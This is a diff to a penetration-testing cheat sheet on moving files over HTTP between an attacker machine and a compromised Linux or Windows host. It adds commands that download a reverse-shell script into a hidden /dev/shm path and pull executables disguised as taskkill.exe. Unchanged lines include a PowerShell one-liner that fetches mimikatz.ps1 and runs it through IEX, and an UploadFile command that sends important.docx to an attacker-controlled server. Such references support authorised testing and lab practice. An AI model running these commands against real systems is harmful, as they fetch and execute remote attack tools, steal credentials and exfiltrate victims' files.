@@ -1,6 +1,34 @@
 # HTTP
 
-## HTTP Linux Server
+#### Linux
+
+```
+wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
+wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
+curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
+fetch 10.10.14.14:8000/shell.py #FreeBSD
+```
+
+#### Windows
+
+```
+certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
+bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
+
+#PS
+(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
+Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
+wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
+
+Import-Module BitsTransfer
+Start-BitsTransfer -Source $url -Destination $output
+#OR
+Start-BitsTransfer -Source $url -Destination $output -Asynchronous
+```
+
+
+
+## Linux HTTP Server
 
 ```
 python -m SimpleHTTPServer 80
@@ -10,6 +38,26 @@ ruby -run -e httpd . -p 9000
 nc -kl 8000 --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n'; date"
 ```
 
+## Python HTTPS Server
+
+```python
+# from https://gist.github.com/dergachev/7028596
+# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
+# generate server.xml with the following command:
+#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
+# run as follows:
+#    python simple-https-server.py
+# then in your browser, visit:
+#    https://localhost:443
+
+import BaseHTTPServer, SimpleHTTPServer
+import ssl
+
+httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
+httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
+httpd.serve_forever()
+```
+
 ## HTTP/FTP wget from linux
 
 ```
@@ -17,12 +65,6 @@ wget http://ip-addr[:port]/file[-o output-file]
 ```
 
 #### A lesser known usage of wget is its ability to download FTP files as well. To do that, simply prepend a ftp:// before the URL. If the FTP server needs credentials, specify them with --ftp-user=username and --ftp-password=pass.
-
-## HTTP curl from linux/OSX
-
-```
-curl http://ip:port/file -o outfile
-```
 
 ## HTTP powershell from windows
 
@@ -57,32 +99,6 @@ or
 
 ```
 (new-object System.Net.Webclient).DownloadString('http://192.168.50.34:8080/mimikatz.ps1') | IEX
-```
-
-## http certutil from windows
-
-```
-certutil -urlcache -split -f "http://ip-addr:port/file" .[output-file]
-```
-
-{% hint style="info" %}
-remember to type the dot "." before output file name
-{% endhint %}
-
-## http bitsadmin from windows
-
-```
-bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe
-```
-
-## http wget from windows (wrapper for WebClient)
-
-{% hint style="info" %}
-**Win 8 and later PS Invoke-WebRequest**
-{% endhint %}
-
-```
-wget "http://10.0.0.10/nc.exe" -outfile "nc.exe"
 ```
 
 ## http VBscript from windows
@@ -145,4 +161,10 @@ sudo chown www-data: /var/www/uploads
 ```
 C:\Users> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
 ```
+
+## Upload Files
+
+#### python script
+
+[https://gist.github.com/UniIsland/3346170](https://gist.github.com/UniIsland/3346170)
 
